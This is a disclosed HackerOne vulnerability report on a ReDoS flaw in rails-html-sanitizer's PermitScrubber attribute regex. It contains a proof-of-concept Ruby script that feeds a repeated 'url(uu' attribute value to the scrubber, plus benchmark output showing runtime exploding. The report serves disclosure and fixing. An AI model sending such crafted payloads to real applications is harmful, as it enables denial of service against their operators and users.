---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1684163'
original_report_id: '1684163'
title: ReDoS (Rails::Html::PermitScrubber.scrub_attribute)
team_handle: rails
created_at: '2022-08-30T02:48:16.070Z'
disclosed_at: '2023-01-02T13:22:09.017Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: https://github.com/rails/rails
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# ReDoS (Rails::Html::PermitScrubber.scrub_attribute)

## Metadata

- HackerOne Report ID: 1684163
- Weakness: 
- Program: rails
- Disclosed At: 2023-01-02T13:22:09.017Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I have confirmed that ReDoS occurs on `Rails::Html::PermitScrubber.scrub_attribute`.

https://github.com/rails/rails-html-sanitizer/blob/v1.4.3/lib/rails/html/scrubbers.rb#L134

```ruby
      def scrub_attribute(node, attr_node)
        attr_name = if attr_node.namespace
                      "#{attr_node.namespace.prefix}:#{attr_node.node_name}"
                    else
                      attr_node.node_name
                    end

        ...
        if Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF.include?(attr_name)
          attr_node.value = attr_node.value.gsub(/url\s*\(\s*[^#\s][^)]+?\)/m, ' ') if attr_node.value
        end
```        

`/url\s*\(\s*[^#\s][^)]+?\)/m` is where the problem occurs. 

---

### PoC

```ruby
# Gemfile
gem 'rails-html-sanitizer', '~> 1.4', '>= 1.4.3'
```

scrub_benchmark.rb

```ruby
require 'benchmark'
require 'rails-html-sanitizer'

def scrub(length)
  scrubber = Rails::Html::PermitScrubber.new
  scrubber.tags = ['s']
  scrubber.attributes = ['mask']

  mask =  'url(uu' * length

  html_fragment = Loofah.fragment('<s mask="' + mask + '" id="aa">aa</s>')
  html_fragment.scrub!(scrubber)
end

Benchmark.bm do |x|
  x.report { scrub(10) }
  x.report { scrub(100) }
  x.report { scrub(1000) }
  x.report { scrub(10000) }
  x.report { scrub(100000) }
end
```

```
❯ bundle exec ruby scrub_benchmark.rb
       user     system      total        real
   0.000208   0.000020   0.000228 (  0.000226)
   0.000316   0.000001   0.000317 (  0.000320)
   0.023582   0.000039   0.023621 (  0.023653)
   2.430801   0.007312   2.438113 (  2.446419)
 233.864668   0.498743 234.363411 (234.632421)
```

## Impact

ReDoS may occur if scrub is executed in Rails::Html::PermitScrubber.

However, one of the values [Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF](https://github.com/flavorjones/loofah/blob/v2.18.0/lib/loofah/html5/safelist.rb#L583) must be set in `attributes`.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
